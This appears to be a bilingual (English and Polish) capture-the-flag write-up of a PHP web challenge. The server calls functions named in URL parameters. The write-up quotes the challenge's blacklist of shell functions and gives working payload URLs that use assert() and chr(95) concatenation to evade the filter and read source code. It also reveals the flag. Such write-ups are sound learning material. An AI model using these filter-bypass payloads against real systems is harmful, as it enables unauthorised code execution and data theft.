# Banh can (web 100)

###ENG
[PL](#pl-version)

In the task we get a webpage with a form.
We can input some data in the form and submit it, which causes redirection to:

`http://web04.grandprix.whitehatvn.com/index.php?hello=our_input`

And it prints out `Hello our_input`.

There is also a hint in the source code that we can try calling function `hint`.

After a while we figure out that the parameter name is the function name and the value is string argument.
This means we can go to:

`http://web04.grandprix.whitehatvn.com/index.php?hint`

To call hint function.
This functions shows us that there is a blacklist for some inputs:

`$blacklist = array("system", "passthru", "exec", "read", "open", "eval", "backtick", "`", "_");`

We quickly notice that there is one function missing here, which enables us to call any PHP code from a string parameter - `assert`.

So we can call:

`http://web04.grandprix.whitehatvn.com/index.php?assert=phpinfo()`

And it shows us phpinfo, with list of all disabled PHP functions.
It seems there is no way of getting a shell, but maybe we don't need it.
We decide to read index.php just to see what exactly we're dealing with.

While `_` is blacklisted, we can just concatenate string with `chr(95)` instead so we call:

`http://web04.grandprix.whitehatvn.com/index.php?assert=assert(%27print(file%27.chr(95).%27get%27.chr(95).%27contents(%22index.php%22))%27)`

in order to call `assert('file_get_contents("index.php")')

and the flag is in the source code: `WhiteHat{36b32e1f18a0da66de3b9dd29db947155b35320f}`

###PL version

W zadaniu dostajemy stronę internetową z formularzem.
Możemy wpisać dane do formularz i po wysłaniu jesteśmy pod adresem:

`http://web04.grandprix.whitehatvn.com/index.php?hello=our_input`

I widzimy `Hello our_input`

W źródle strony jest też wskazówka żeby wywołać funkcje `hint`.

Po pewnym czasie doszliśmy do wniosku że nazwa parametru to nazwa funkcji a wartość to argument jako string.
To oznacza że możemy przejść pod:

`http://web04.grandprix.whitehatvn.com/index.php?hint`

aby wywołać funkcje 1hint()`.
Ta funkcja pokazuje nam, że pewne wejścia są blacklistowane:

`$blacklist = array("system", "passthru", "exec", "read", "open", "eval", "backtick", "`", "_");`

Szybko zauważamy że brakuje tutaj jednej funkcji, która pozwala wykonać dowolny kod PHP z parametru będącego stringiem - `assert`.

Możemy więc wołać:

`http://web04.grandprix.whitehatvn.com/index.php?assert=phpinfo()`

A to pokaże nam wynik wywołania phpinfo, z listą funkcji PHP które są wyłączone.
Wygląda na to że nie ma szans na zdobycie shella, ale może go nie potrzebujemy.
Postanowiliśmy pobrać index.php żeby sprawdzić co dokładnie dzieje się w skrypcie.

Co prawda `_` jest na blackliście, ale możemy po prostu skleić sobie stringa z `chr(95)` zamiast tego, więc wołamy:

`http://web04.grandprix.whitehatvn.com/index.php?assert=assert(%27print(file%27.chr(95).%27get%27.chr(95).%27contents(%22index.php%22))%27)`

Aby wywołać `assert('file_get_contents("index.php")')

I w źródle jest już flaga: `WhiteHat{36b32e1f18a0da66de3b9dd29db947155b35320f}`
